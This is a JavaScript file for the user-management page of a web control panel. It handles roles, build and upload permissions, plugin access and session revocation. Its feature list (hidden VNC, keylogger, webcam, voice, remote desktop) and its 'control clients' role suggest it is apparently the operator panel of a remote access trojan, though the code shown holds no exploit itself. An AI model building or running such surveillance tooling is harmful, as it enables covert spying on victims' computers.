let currentUser = null;
let users = [];

const usersTableBody = document.getElementById("users-table-body");
const addUserBtn = document.getElementById("add-user-btn");
const userModal = document.getElementById("user-modal");
const modalTitle = document.getElementById("modal-title");
const userForm = document.getElementById("user-form");
const closeModal = document.getElementById("close-modal");
const cancelBtn = document.getElementById("cancel-btn");
const errorMessage = document.getElementById("error-message");
const errorText = document.getElementById("error-text");
const logoutBtn = document.getElementById("logout-btn");
const currentUserEl = document.getElementById("username-display");
const currentRoleEl = document.getElementById("role-badge");

async function getCurrentUser() {
  try {
    const res = await fetch("/api/auth/me");
    if (res.ok) {
      currentUser = await res.json();
      currentUserEl.textContent = currentUser.username;

      const roleBadges = {
        admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
        operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
        viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
      };
      if (roleBadges[currentUser.role]) {
        currentRoleEl.innerHTML = roleBadges[currentUser.role];
      } else {
        currentRoleEl.textContent = currentUser.role || "";
      }

      if (currentUser.role === "admin") {
        currentRoleEl.classList.add(
          "bg-purple-900/50",
          "text-purple-300",
          "border",
          "border-purple-800",
        );
      } else if (currentUser.role === "operator") {
        currentRoleEl.classList.add(
          "bg-blue-900/50",
          "text-blue-300",
          "border",
          "border-blue-800",
        );
      } else {
        currentRoleEl.classList.add(
          "bg-slate-700",
          "text-slate-300",
          "border",
          "border-slate-600",
        );
      }

      if (currentUser.role === "admin") {
        document.getElementById("metrics-link")?.classList.remove("hidden");
        document.getElementById("scripts-link")?.classList.remove("hidden");
        document.getElementById("build-link")?.classList.remove("hidden");
        document.getElementById("users-link")?.classList.remove("hidden");
        document.getElementById("plugins-link")?.classList.remove("hidden");
        document.getElementById("deploy-link")?.classList.remove("hidden");
      } else if (currentUser.role === "operator") {
        document.getElementById("metrics-link")?.classList.remove("hidden");
        document.getElementById("scripts-link")?.classList.remove("hidden");
        document.getElementById("build-link")?.classList.remove("hidden");
      }

      if (currentUser.canBuild) {
        document.getElementById("build-link")?.classList.remove("hidden");
      }

      if (currentUser.role !== "admin") {
        alert("Access denied. Admin role required.");
        window.location.href = "/";
      }
    } else {
      window.location.href = "/";
    }
  } catch (err) {
    console.error("Failed to get current user:", err);
    window.location.href = "/";
  }
}

if (logoutBtn && !logoutBtn.dataset.boundLogout) {
  logoutBtn.dataset.boundLogout = "true";
  logoutBtn.addEventListener("click", async () => {
    if (!confirm("Are you sure you want to logout?")) return;

    try {
      const res = await fetch("/api/logout", { method: "POST" });
      if (res.ok) {
        window.location.href = "/";
      } else {
        alert("Logout failed. Please try again.");
      }
    } catch (err) {
      console.error("Logout error:", err);
      alert("Logout failed. Please try again.");
    }
  });
}

async function loadUsers() {
  try {
    const res = await fetch("/api/users");
    if (!res.ok) {
      throw new Error("Failed to load users");
    }

    const data = await res.json();
    users = data.users || [];
    renderUsers();
  } catch (err) {
    console.error("Load users error:", err);
    usersTableBody.innerHTML = `
      <tr>
        <td colspan="6" class="px-6 py-12 text-center text-red-400">
          <i class="fa-solid fa-exclamation-triangle mr-2"></i>
          Failed to load users
        </td>
      </tr>
    `;
  }
}

function renderUsers() {
  if (users.length === 0) {
    usersTableBody.innerHTML = `
      <tr>
        <td colspan="6" class="px-6 py-12 text-center text-slate-400">
          <i class="fa-solid fa-users mr-2"></i>
          No users found
        </td>
      </tr>
    `;
    return;
  }

  usersTableBody.innerHTML = users
    .map(
      (user) => `
    <tr class="hover:bg-slate-800/30 transition-colors">
      <td class="px-6 py-4">
        <div class="flex items-center gap-2">
          <i class="fa-solid fa-user text-slate-400"></i>
          <span class="font-medium text-slate-200">${escapeHtml(user.username)}</span>
          ${user.id === currentUser?.userId ? '<span class="text-xs text-blue-400">(You)</span>' : ""}
        </div>
      </td>
      <td class="px-6 py-4">
        ${getRoleBadge(user.role)}
        ${user.role !== "admin" ? `
          <span class="ml-1 inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium cursor-pointer transition-colors ${user.can_build ? 'bg-green-900/30 text-green-300 border border-green-800 hover:bg-green-900/50' : 'bg-slate-700/30 text-slate-500 border border-slate-700 hover:bg-slate-700/50'}" 
            data-action="toggle-build" data-user-id="${user.id}" data-username="${escapeHtml(user.username)}" data-can-build="${user.can_build ? 1 : 0}"
            title="${user.can_build ? 'Can build (click to revoke)' : 'Cannot build (click to grant)'}">
            <i class="fa-solid fa-hammer mr-1"></i>${user.can_build ? 'Build' : 'No Build'}
          </span>
          <span class="ml-1 inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium cursor-pointer transition-colors ${user.can_upload_files ? 'bg-teal-900/30 text-teal-300 border border-teal-800 hover:bg-teal-900/50' : 'bg-slate-700/30 text-slate-500 border border-slate-700 hover:bg-slate-700/50'}" 
            data-action="toggle-upload" data-user-id="${user.id}" data-username="${escapeHtml(user.username)}" data-can-upload="${user.can_upload_files ? 1 : 0}"
            title="${user.can_upload_files ? 'Can upload files (click to revoke)' : 'Cannot upload files (click to grant)'}">
            <i class="fa-solid fa-cloud-arrow-up mr-1"></i>${user.can_upload_files ? 'Upload' : 'No Upload'}
          </span>
        ` : ''}
      </td>
      <td class="px-6 py-4 text-sm text-slate-400">
        ${formatDate(user.created_at)}
      </td>
      <td class="px-6 py-4 text-sm text-slate-400">
        ${user.last_login ? formatDate(user.last_login) : '<span class="text-slate-500">Never</span>'}
      </td>
      <td class="px-6 py-4 text-sm text-slate-400">
        ${escapeHtml(user.created_by || "System")}
      </td>
      <td class="px-6 py-4">
        <div class="flex items-center justify-end gap-2">
          ${
            user.id !== currentUser?.userId
              ? `
            <button 
              class="user-action-btn px-3 py-1.5 text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 rounded border border-slate-700 transition-colors"
              data-action="change-password"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              title="Change Password"
            >
              <i class="fa-solid fa-key"></i>
            </button>
            <button 
              class="user-action-btn px-3 py-1.5 text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 rounded border border-slate-700 transition-colors"
              data-action="change-role"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              data-role="${escapeHtml(user.role)}"
              title="Change Role"
            >
              <i class="fa-solid fa-user-tag"></i>
            </button>
            <button 
              class="user-action-btn px-3 py-1.5 text-sm bg-indigo-900/30 hover:bg-indigo-900/50 text-indigo-300 rounded border border-indigo-800 transition-colors"
              data-action="client-access"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              data-role="${escapeHtml(user.role)}"
              title="Client Visibility"
            >
              <i class="fa-solid fa-user-shield"></i>
            </button>
            ${user.role === "operator" ? `
            <button
              class="user-action-btn px-3 py-1.5 text-sm bg-amber-900/30 hover:bg-amber-900/50 text-amber-300 rounded border border-amber-800 transition-colors"
              data-action="feature-permissions"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              title="Feature Permissions"
            >
              <i class="fa-solid fa-sliders"></i>
            </button>
            ` : ''}
            ${user.role !== "admin" ? `
            <button
              class="user-action-btn px-3 py-1.5 text-sm bg-emerald-900/30 hover:bg-emerald-900/50 text-emerald-300 rounded border border-emerald-800 transition-colors"
              data-action="plugin-access"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              title="Plugin Access"
            >
              <i class="fa-solid fa-puzzle-piece"></i>
            </button>
            ` : ''}
            <button 
              class="user-action-btn px-3 py-1.5 text-sm bg-cyan-900/30 hover:bg-cyan-900/50 text-cyan-300 rounded border border-cyan-800 transition-colors"
              data-action="view-sessions"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              title="View Sessions"
            >
              <i class="fa-solid fa-desktop"></i>
            </button>
            <button 
              class="user-action-btn px-3 py-1.5 text-sm bg-red-900/20 hover:bg-red-900/40 text-red-400 rounded border border-red-800 transition-colors"
              data-action="delete"
              data-user-id="${user.id}"
              data-username="${escapeHtml(user.username)}"
              title="Delete User"
            >
              <i class="fa-solid fa-trash"></i>
            </button>
          `
              : '<span class="text-slate-500 text-sm italic">Cannot edit yourself</span>'
          }
        </div>
      </td>
    </tr>
  `,
    )
    .join("");

  attachActionListeners();
}

function getRoleBadge(role) {
  const badges = {
    admin:
      '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-900/30 text-purple-300 border border-purple-800"><i class="fa-solid fa-crown mr-1"></i>Admin</span>',
    operator:
      '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-900/30 text-blue-300 border border-blue-800"><i class="fa-solid fa-sliders mr-1"></i>Operator</span>',
    viewer:
      '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-700/50 text-slate-300 border border-slate-600"><i class="fa-solid fa-eye mr-1"></i>Viewer</span>',
  };
  return badges[role] || escapeHtml(role || "");
}

function attachActionListeners() {
  const oldListener = usersTableBody._actionListener;
  if (oldListener) {
    usersTableBody.removeEventListener("click", oldListener);
  }

  const listener = (e) => {
    const toggleBuild = e.target.closest("[data-action='toggle-build']");
    if (toggleBuild) {
      const userId = parseInt(toggleBuild.dataset.userId);
      const username = toggleBuild.dataset.username;
      const canBuild = toggleBuild.dataset.canBuild === "1";
      toggleBuildPermission(userId, username, canBuild);
      return;
    }

    const toggleUpload = e.target.closest("[data-action='toggle-upload']");
    if (toggleUpload) {
      const userId = parseInt(toggleUpload.dataset.userId);
      const username = toggleUpload.dataset.username;
      const canUpload = toggleUpload.dataset.canUpload === "1";
      toggleUploadPermission(userId, username, canUpload);
      return;
    }

    const btn = e.target.closest(".user-action-btn");
    if (!btn) return;

    const action = btn.dataset.action;
    const userId = parseInt(btn.dataset.userId);
    const username = btn.dataset.username;
    const role = btn.dataset.role;

    switch (action) {
      case "change-password":
        changePassword(userId, username);
        break;
      case "change-role":
        changeRole(userId, username, role);
        break;
      case "delete":
        deleteUser(userId, username);
        break;
      case "client-access":
        configureClientAccess(userId, username, role);
        break;
      case "feature-permissions":
        configureFeaturePermissions(userId, username);
        break;
      case "plugin-access":
        configurePluginAccess(userId, username);
        break;
      case "view-sessions":
        viewUserSessions(userId, username);
        break;
    }
  };

  usersTableBody.addEventListener("click", listener);
  usersTableBody._actionListener = listener;
}

function formatDate(timestamp) {
  const date = new Date(timestamp);
  return date.toLocaleString();
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

function showModal(title) {
  modalTitle.textContent = title;
  userModal.classList.remove("hidden");
  errorMessage.classList.add("hidden");
  userForm.reset();
}

function hideModal() {
  userModal.classList.add("hidden");
  userForm.reset();
}

function showError(message) {
  errorText.textContent = message;
  errorMessage.classList.remove("hidden");
}

addUserBtn.addEventListener("click", () => {
  showModal("Add User");
  document.getElementById("password-field").classList.remove("hidden");
  document.getElementById("password").required = true;
});

closeModal.addEventListener("click", hideModal);
cancelBtn.addEventListener("click", hideModal);

userForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const formData = new FormData(userForm);
  const username = formData.get("username");
  const password = formData.get("password");
  const role = formData.get("role");

  try {
    const res = await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password, role }),
    });

    const data = await res.json();

    if (res.ok) {
      hideModal();
      await loadUsers();
    } else {
      showError(data.error || "Failed to create user");
    }
  } catch (err) {
    console.error("Create user error:", err);
    showError("Network error. Please try again.");
  }
});

window.changePassword = async function (userId, username) {
  const password = prompt(`Enter new password for ${username}:`);
  if (!password) return;

  if (password.length < 6) {
    alert("Password must be at least 6 characters");
    return;
  }

  try {
    const res = await fetch(`/api/users/${userId}/password`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password }),
    });

    const data = await res.json();

    if (res.ok) {
      alert("Password updated successfully");
    } else {
      alert(data.error || "Failed to update password");
    }
  } catch (err) {
    console.error("Update password error:", err);
    alert("Network error. Please try again.");
  }
};

window.changeRole = async function (userId, username, currentRole) {
  const roles = ["viewer", "operator", "admin"];
  const roleNames = { viewer: "Viewer", operator: "Operator", admin: "Admin" };

  const message = `Select new role for ${username}:\n\n1. Viewer (Read-only)\n2. Operator (Control clients)\n3. Admin (Full access)\n\nCurrent: ${roleNames[currentRole]}`;
  const choice = prompt(message);

  if (!choice || !["1", "2", "3"].includes(choice)) return;

  const newRole = roles[parseInt(choice) - 1];

  if (newRole === currentRole) {
    alert("No change made");
    return;
  }

  if (!confirm(`Change ${username}'s role to ${roleNames[newRole]}?`)) return;

  try {
    const res = await fetch(`/api/users/${userId}/role`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ role: newRole }),
    });

    const data = await res.json();

    if (res.ok) {
      alert("Role updated successfully");
      await loadUsers();
    } else {
      alert(data.error || "Failed to update role");
    }
  } catch (err) {
    console.error("Update role error:", err);
    alert("Network error. Please try again.");
  }
};

window.deleteUser = async function (userId, username) {
  if (
    !confirm(
      `Are you sure you want to delete user "${username}"? This action cannot be undone.`,
    )
  ) {
    return;
  }

  try {
    const res = await fetch(`/api/users/${userId}`, {
      method: "DELETE",
    });

    const data = await res.json();

    if (res.ok) {
      alert("User deleted successfully");
      await loadUsers();
    } else {
      alert(data.error || "Failed to delete user");
    }
  } catch (err) {
    console.error("Delete user error:", err);
    alert("Network error. Please try again.");
  }
};

window.configureClientAccess = async function (userId, username, role) {
  const params = new URLSearchParams({ userId: String(userId) });
  window.location.href = `/user-client-access?${params.toString()}`;
};

const FEATURE_LABELS = {
  console: { label: "Console", icon: "fa-terminal" },
  remote_desktop: { label: "Remote Desktop", icon: "fa-desktop" },
  hvnc: { label: "HVNC", icon: "fa-window-restore" },
  webcam: { label: "Webcam", icon: "fa-video" },
  file_browser: { label: "File Browser", icon: "fa-folder-open" },
  processes: { label: "Processes", icon: "fa-microchip" },
  keylogger: { label: "Keylogger", icon: "fa-keyboard" },
  voice: { label: "Voice", icon: "fa-microphone" },
};

window.configureFeaturePermissions = async function (userId, username) {
  try {
    const res = await fetch(`/api/users/${userId}/feature-permissions`);
    if (!res.ok) throw new Error("Failed to load feature permissions");
    const data = await res.json();
    const perms = data.permissions;
    const features = data.features;

    let modal = document.getElementById("feature-perms-modal");
    if (modal) modal.remove();

    modal = document.createElement("div");
    modal.id = "feature-perms-modal";
    modal.className = "fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4";
    modal.innerHTML = `
      <div class="bg-slate-900 border border-slate-700 rounded-xl max-w-md w-full p-6 shadow-2xl">
        <div class="flex items-center justify-between mb-6">
          <h3 class="text-xl font-bold text-slate-100">Feature Permissions</h3>
          <button id="close-feature-modal" class="text-slate-400 hover:text-slate-200 transition-colors">
            <i class="fa-solid fa-times text-xl"></i>
          </button>
        </div>
        <p class="text-sm text-slate-400 mb-4">
          Manage feature access for <span class="text-slate-200 font-medium">${escapeHtml(username)}</span>. 
          Disabled features will return 403 when accessed.
        </p>
        <div class="space-y-2 mb-6" id="feature-toggles">
          ${features.map(f => {
            const meta = FEATURE_LABELS[f] || { label: f, icon: "fa-puzzle-piece" };
            const checked = perms[f] !== false;
            return `
              <label class="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg border border-slate-700 hover:border-slate-600 cursor-pointer transition-colors">
                <div class="flex items-center gap-3">
                  <i class="fa-solid ${meta.icon} text-slate-400 w-5 text-center"></i>
                  <span class="text-slate-200 font-medium">${meta.label}</span>
                </div>
                <input type="checkbox" data-feature="${f}" ${checked ? "checked" : ""} 
                  class="w-5 h-5 rounded bg-slate-700 border-slate-600 text-blue-500 focus:ring-blue-500 focus:ring-offset-0 cursor-pointer" />
              </label>`;
          }).join("")}
        </div>
        <div class="flex gap-3">
          <button id="reset-feature-perms" class="flex-1 px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg border border-slate-700 transition-colors font-medium">
            Reset to Defaults
          </button>
          <button id="save-feature-perms" class="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors font-medium">
            <i class="fa-solid fa-check mr-2"></i>Save
          </button>
        </div>
      </div>`;
    document.body.appendChild(modal);

    document.getElementById("close-feature-modal").addEventListener("click", () => modal.remove());
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.remove(); });

    document.getElementById("save-feature-perms").addEventListener("click", async () => {
      const toggles = modal.querySelectorAll("[data-feature]");
      const permissions = {};
      toggles.forEach(t => { permissions[t.dataset.feature] = t.checked; });

      try {
        const saveRes = await fetch(`/api/users/${userId}/feature-permissions`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ permissions }),
        });
        if (!saveRes.ok) throw new Error("Failed to save");
        modal.remove();
        if (window.showToast) window.showToast("Feature permissions updated", "success");
      } catch (err) {
        alert("Failed to save feature permissions");
      }
    });

    document.getElementById("reset-feature-perms").addEventListener("click", async () => {
      if (!confirm("Reset all feature permissions to defaults (all enabled)?")) return;
      try {
        const delRes = await fetch(`/api/users/${userId}/feature-permissions`, { method: "DELETE" });
        if (!delRes.ok) throw new Error("Failed to reset");
        modal.remove();
        if (window.showToast) window.showToast("Feature permissions reset", "success");
      } catch (err) {
        alert("Failed to reset feature permissions");
      }
    });
  } catch (err) {
    console.error("Feature permissions error:", err);
    alert("Failed to load feature permissions");
  }
};

window.configurePluginAccess = async function (userId, username) {
  try {
    const [accessRes, pluginsRes] = await Promise.all([
      fetch(`/api/users/${userId}/plugin-access`),
      fetch("/api/plugins"),
    ]);
    if (!accessRes.ok) throw new Error("Failed to load plugin access");

    const accessData = await accessRes.json();
    const currentScope = accessData.scope || "none";
    const allowedIds = new Set((accessData.rules || []).map(r => r.pluginId));

    let allPlugins = [];
    if (pluginsRes.ok) {
      const pluginsData = await pluginsRes.json();
      allPlugins = pluginsData.plugins || [];
    }

    let modal = document.getElementById("plugin-access-modal");
    if (modal) modal.remove();

    modal = document.createElement("div");
    modal.id = "plugin-access-modal";
    modal.className = "fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4";

    const scopeOptions = [
      { value: "none", label: "No Access", desc: "User cannot access any plugins" },
      { value: "allowlist", label: "Selected Plugins", desc: "User can only access checked plugins" },
      { value: "all", label: "All Plugins", desc: "User can access all plugins" },
    ];

    modal.innerHTML = `
      <div class="bg-slate-900 border border-slate-700 rounded-xl max-w-md w-full p-6 shadow-2xl max-h-[85vh] flex flex-col">
        <div class="flex items-center justify-between mb-4">
          <h3 class="text-xl font-bold text-slate-100">Plugin Access</h3>
          <button id="close-plugin-modal" class="text-slate-400 hover:text-slate-200 transition-colors">
            <i class="fa-solid fa-times text-xl"></i>
          </button>
        </div>
        <p class="text-sm text-slate-400 mb-4">
          Manage plugin access for <span class="text-slate-200 font-medium">${escapeHtml(username)}</span>.
        </p>
        <div class="mb-4">
          <label class="block text-sm font-medium text-slate-300 mb-2">Access Mode</label>
          <select id="plugin-scope-select" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-slate-200 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500">
            ${scopeOptions.map(o => `<option value="${o.value}" ${o.value === currentScope ? "selected" : ""}>${o.label}</option>`).join("")}
          </select>
          <p id="plugin-scope-desc" class="text-xs text-slate-500 mt-1">${scopeOptions.find(o => o.value === currentScope)?.desc || ""}</p>
        </div>
        <div id="plugin-list-section" class="${currentScope !== "allowlist" ? "hidden" : ""} flex-1 overflow-y-auto mb-4">
          <label class="block text-sm font-medium text-slate-300 mb-2">Select Plugins</label>
          <div class="space-y-2" id="plugin-toggles">
            ${allPlugins.length === 0
              ? '<p class="text-sm text-slate-500 italic">No plugins installed</p>'
              : allPlugins.map(p => `
                <label class="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg border border-slate-700 hover:border-slate-600 cursor-pointer transition-colors">
                  <div class="flex items-center gap-3">
                    <i class="fa-solid fa-puzzle-piece text-slate-400 w-5 text-center"></i>
                    <span class="text-slate-200 font-medium">${escapeHtml(p.name || p.id)}</span>
                    <span class="text-xs text-slate-500">${escapeHtml(p.id)}</span>
                  </div>
                  <input type="checkbox" data-plugin-id="${escapeHtml(p.id)}" ${allowedIds.has(p.id) ? "checked" : ""}
                    class="w-5 h-5 rounded bg-slate-700 border-slate-600 text-emerald-500 focus:ring-emerald-500 focus:ring-offset-0 cursor-pointer" />
                </label>`).join("")}
          </div>
        </div>
        <div class="flex gap-3">
          <button id="cancel-plugin-access" class="flex-1 px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg border border-slate-700 transition-colors font-medium">
            Cancel
          </button>
          <button id="save-plugin-access" class="flex-1 px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg transition-colors font-medium">
            <i class="fa-solid fa-check mr-2"></i>Save
          </button>
        </div>
      </div>`;
    document.body.appendChild(modal);

    const scopeSelect = document.getElementById("plugin-scope-select");
    const scopeDesc = document.getElementById("plugin-scope-desc");
    const listSection = document.getElementById("plugin-list-section");

    scopeSelect.addEventListener("change", () => {
      const val = scopeSelect.value;
      const opt = scopeOptions.find(o => o.value === val);
      scopeDesc.textContent = opt?.desc || "";
      if (val === "allowlist") {
        listSection.classList.remove("hidden");
      } else {
        listSection.classList.add("hidden");
      }
    });

    document.getElementById("close-plugin-modal").addEventListener("click", () => modal.remove());
    document.getElementById("cancel-plugin-access").addEventListener("click", () => modal.remove());
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.remove(); });

    document.getElementById("save-plugin-access").addEventListener("click", async () => {
      const scope = scopeSelect.value;
      const pluginIds = [];
      if (scope === "allowlist") {
        modal.querySelectorAll("[data-plugin-id]").forEach(cb => {
          if (cb.checked) pluginIds.push(cb.dataset.pluginId);
        });
      }

      try {
        const saveRes = await fetch(`/api/users/${userId}/plugin-access`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ scope, pluginIds }),
        });
        if (!saveRes.ok) {
          const err = await saveRes.json().catch(() => ({}));
          throw new Error(err.error || "Failed to save");
        }
        modal.remove();
        if (window.showToast) window.showToast("Plugin access updated", "success");
      } catch (err) {
        alert("Failed to save plugin access: " + err.message);
      }
    });
  } catch (err) {
    console.error("Plugin access error:", err);
    alert("Failed to load plugin access settings");
  }
};

window.toggleBuildPermission = async function (userId, username, currentCanBuild) {
  const newVal = !currentCanBuild;
  if (!confirm(`${newVal ? 'Grant' : 'Revoke'} build permission for ${username}?`)) return;

  try {
    const res = await fetch(`/api/users/${userId}/can-build`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ canBuild: newVal }),
    });

    const data = await res.json();

    if (res.ok) {
      await loadUsers();
    } else {
      alert(data.error || "Failed to update build permission");
    }
  } catch (err) {
    console.error("Toggle build permission error:", err);
    alert("Network error. Please try again.");
  }
};

window.toggleUploadPermission = async function (userId, username, currentCanUpload) {
  const newVal = !currentCanUpload;
  if (!confirm(`${newVal ? 'Grant' : 'Revoke'} file upload permission for ${username}?`)) return;

  try {
    const res = await fetch(`/api/users/${userId}/can-upload-files`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ canUploadFiles: newVal }),
    });

    const data = await res.json();

    if (res.ok) {
      await loadUsers();
    } else {
      alert(data.error || "Failed to update upload permission");
    }
  } catch (err) {
    console.error("Toggle upload permission error:", err);
    alert("Network error. Please try again.");
  }
};

async function viewUserSessions(userId, username) {
  try {
    const res = await fetch(`/api/users/${userId}/sessions`);
    if (!res.ok) throw new Error("Failed to fetch sessions");
    const data = await res.json();
    const sessions = Array.isArray(data.sessions) ? data.sessions : [];

    const existing = document.getElementById("sessions-modal");
    if (existing) existing.remove();

    const modal = document.createElement("div");
    modal.id = "sessions-modal";
    modal.className = "fixed inset-0 z-50 flex items-center justify-center bg-black/60";

    const now = Math.floor(Date.now() / 1000);

    const rows = sessions.length === 0
      ? `<tr><td colspan="5" class="px-3 py-6 text-center text-slate-400">No sessions</td></tr>`
      : sessions.map(s => {
          const isExpired = s.expiresAt && s.expiresAt < now;
          const status = s.revoked
            ? '<span class="text-rose-400">Revoked</span>'
            : isExpired
              ? '<span class="text-slate-500">Expired</span>'
              : '<span class="text-emerald-400">Active</span>';
          const canRevoke = !s.revoked && !isExpired;
          const lastAct = s.lastActivity ? formatRelTime(s.lastActivity) : "—";

          return `<tr>
            <td class="px-3 py-2 font-mono text-xs text-slate-100">${escapeHtml(s.ip || "—")}</td>
            <td class="px-3 py-2 text-slate-400 text-xs">${lastAct}</td>
            <td class="px-3 py-2 text-xs">${status}</td>
            <td class="px-3 py-2 text-right">
              ${canRevoke ? `<button class="admin-revoke-session-btn px-2 py-1 rounded bg-red-700/80 hover:bg-red-600 text-white text-xs" data-session-id="${escapeHtml(s.id)}"><i class="fa-solid fa-ban mr-1"></i>Revoke</button>` : ""}
            </td>
          </tr>`;
        }).join("");

    modal.innerHTML = `
      <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 max-w-2xl w-full mx-4 max-h-[80vh] overflow-y-auto">
        <div class="flex items-center justify-between mb-4">
          <h3 class="text-lg font-semibold text-slate-100">Sessions — ${escapeHtml(username)}</h3>
          <div class="flex items-center gap-2">
            ${sessions.some(s => !s.revoked) ? `<button id="revoke-all-sessions-btn" class="px-3 py-1.5 text-xs bg-red-700/80 hover:bg-red-600 text-white rounded border border-red-600"><i class="fa-solid fa-ban mr-1"></i>Revoke All</button>` : ""}
            <button id="close-sessions-modal" class="px-3 py-1.5 text-sm bg-slate-700 hover:bg-slate-600 text-white rounded">Close</button>
          </div>
        </div>
        <div class="overflow-x-auto border border-slate-800 rounded-lg">
          <table class="w-full text-sm">
            <thead class="bg-slate-800/60 text-slate-300">
              <tr>
                <th class="text-left px-3 py-2">IP</th>
                <th class="text-left px-3 py-2">Last Active</th>
                <th class="text-left px-3 py-2">Status</th>
                <th class="text-right px-3 py-2">Action</th>
              </tr>
            </thead>
            <tbody class="divide-y divide-slate-800">${rows}</tbody>
          </table>
        </div>
      </div>
    `;

    document.body.appendChild(modal);

    modal.addEventListener("click", (e) => {
      if (e.target === modal || e.target.closest("#close-sessions-modal")) {
        modal.remove();
      }
    });

    modal.querySelectorAll(".admin-revoke-session-btn").forEach(btn => {
      btn.addEventListener("click", async () => {
        btn.disabled = true;
        try {
          const r = await fetch(`/api/sessions/${encodeURIComponent(btn.dataset.sessionId)}`, {
            method: "DELETE",
          });
          if (!r.ok) throw new Error("Failed");
          modal.remove();
          viewUserSessions(userId, username);
        } catch {
          alert("Failed to revoke session");
          btn.disabled = false;
        }
      });
    });

    const revokeAllBtn = document.getElementById("revoke-all-sessions-btn");
    if (revokeAllBtn) {
      revokeAllBtn.addEventListener("click", async () => {
        if (!confirm(`Revoke all sessions for ${username}? They will be logged out immediately.`)) return;
        revokeAllBtn.disabled = true;
        try {
          const r = await fetch(`/api/users/${userId}/sessions`, { method: "DELETE" });
          if (!r.ok) throw new Error("Failed");
          modal.remove();
          viewUserSessions(userId, username);
        } catch {
          alert("Failed to revoke sessions");
          revokeAllBtn.disabled = false;
        }
      });
    }
  } catch (err) {
    console.error("View sessions error:", err);
    alert("Failed to load sessions");
  }
}

function formatRelTime(epochSeconds) {
  if (!epochSeconds) return "—";
  const diff = Math.floor(Date.now() / 1000) - epochSeconds;
  if (diff < 60) return "Just now";
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

getCurrentUser();
loadUsers();
